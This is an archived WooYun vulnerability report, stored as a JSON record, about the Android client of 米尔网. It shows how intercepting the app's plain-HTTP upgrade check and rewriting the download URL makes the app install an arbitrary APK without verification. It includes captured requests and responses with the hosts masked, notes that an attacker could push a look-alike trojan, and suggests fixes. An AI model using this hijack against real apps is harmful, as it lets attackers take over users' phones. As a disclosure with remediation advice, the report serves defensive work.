{"id": 83304, "wybug_id": "wooyun-2015-0148285", "wybug_title": "米尔客户端APP升级过程存在缺陷可被中间人攻击利用植入木马", "wybug_corp": "米尔网", "wybug_author": "路人甲", "wybug_date": "2015-10-21 11:49", "wybug_open_date": "2016-01-24 11:50", "wybug_type": "非授权访问/认证绕过", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "客户端程序设计错误", "安全", "手机软件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-26：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-24：\t细节向公众公开  简要描述： 米尔安卓APP客户端在升级过程中，校验过程不严格，可以导致被中间人利用，劫持安装任意应用 详细说明：  使用fildder，抓包，修改返回数据包中的url地址，即可对app客户端升级进行劫持，任意安装应用点击客户端，检测最新版本正常客户端发包和服务端返回数据如下\nGET http://**.**.**.**/api/2.0.3/upgrade.php?plat=android&proct=mierapp&versioncode=20150807&apiCode=4 HTTP/1.1Content-Length: 0Host: **.**.**.**Connection: Keep-AliveUser-Agent: Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; SM-G900F Build/KOT49H) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1Accept-Encoding: gzip\n正常的服务端返回数据包如下\nHTTP/1.1 200 OKServer: M_cdnDate: Wed, 21 Oct 2015 02:56:26 GMTContent-Type: text/html; charset=UTF-8Connection: keep-aliveKeep-Alive: timeout=2Vary: Accept-EncodingX-Powered-By: PHP/5.6.12Content-Length: 335{\"versionCode\": \"20150804\",\"versionName\": \"2.2.3\",\"downloadUrl\":\t\t\"http://**.**.**.**/download/2.2.3/miercn_upgrade.apk\",\"updateLog\": \"1.社区全新改版，增加网友实时动态\\n2.修复了启动软件偶尔闪退的问题\\n3.修复了自动登陆延迟的问题\\n4.减少了移动网络的流量损耗\\n5.新增视频栏目\"}\n\n\n修改数据包中url为**.**.**.**/app/xrt-v1.0.apk，版本大于当前版本2.2.3即可\nHTTP/1.1 200 OKServer: M_cdnDate: Wed, 21 Oct 2015 02:47:04 GMTContent-Type: text/html; charset=UTF-8Connection: keep-aliveKeep-Alive: timeout=2Vary: Accept-EncodingX-Powered-By: PHP/5.6.12Content-Length: 320{\"versionCode\": \"20151004\",\"versionName\": \"2.2.5\",\"downloadUrl\":\t\t\"**.**.**.**/app/xrt-v1.0.apk\",\"updateLog\": \"1.社区全新改版，增加网友实时动态\\n2.修复了启动软件偶尔闪退的问题\\n3.修复了自动登陆延迟的问题\\n4.减少了移动网络的流量损耗\\n5.新增视频栏目\"}\n\n\n下载后，无校验，即可安装该apk\n\n   漏洞证明：  使用fildder，抓包，修改返回数据包中的url地址，即可对app客户端升级进行劫持，任意安装应用点击客户端，检测最新版本正常客户端发包和服务端返回数据如下\nGET http://**.**.**.**/api/2.0.3/upgrade.php?plat=android&proct=mierapp&versioncode=20150807&apiCode=4 HTTP/1.1Content-Length: 0Host: **.**.**.**Connection: Keep-AliveUser-Agent: Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; SM-G900F Build/KOT49H) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1Accept-Encoding: gzip\n正常的服务端返回数据包如下\nHTTP/1.1 200 OKServer: M_cdnDate: Wed, 21 Oct 2015 02:56:26 GMTContent-Type: text/html; charset=UTF-8Connection: keep-aliveKeep-Alive: timeout=2Vary: Accept-EncodingX-Powered-By: PHP/5.6.12Content-Length: 335{\"versionCode\": \"20150804\",\"versionName\": \"2.2.3\",\"downloadUrl\":\t\t\"http://**.**.**.**/download/2.2.3/miercn_upgrade.apk\",\"updateLog\": \"1.社区全新改版，增加网友实时动态\\n2.修复了启动软件偶尔闪退的问题\\n3.修复了自动登陆延迟的问题\\n4.减少了移动网络的流量损耗\\n5.新增视频栏目\"}\n\n\n修改数据包中url为**.**.**.**/app/xrt-v1.0.apk，版本大于当前版本2.2.3即可\nHTTP/1.1 200 OKServer: M_cdnDate: Wed, 21 Oct 2015 02:47:04 GMTContent-Type: text/html; charset=UTF-8Connection: keep-aliveKeep-Alive: timeout=2Vary: Accept-EncodingX-Powered-By: PHP/5.6.12Content-Length: 320{\"versionCode\": \"20151004\",\"versionName\": \"2.2.5\",\"downloadUrl\":\t\t\"**.**.**.**/app/xrt-v1.0.apk\",\"updateLog\": \"1.社区全新改版，增加网友实时动态\\n2.修复了启动软件偶尔闪退的问题\\n3.修复了自动登陆延迟的问题\\n4.减少了移动网络的流量损耗\\n5.新增视频栏目\"}\n\n\n下载后，无校验，即可安装该apk\n\n用户看到的界面是正常的,点击确定后，该apk就会安装如果恶意攻击者生成一个同图标同名的木马应用,一般用户会不加思索的安装然后手机被攻击者控制   修复方案：  1、修改升级协议2、校验升级文件   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-01-24 11:50 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}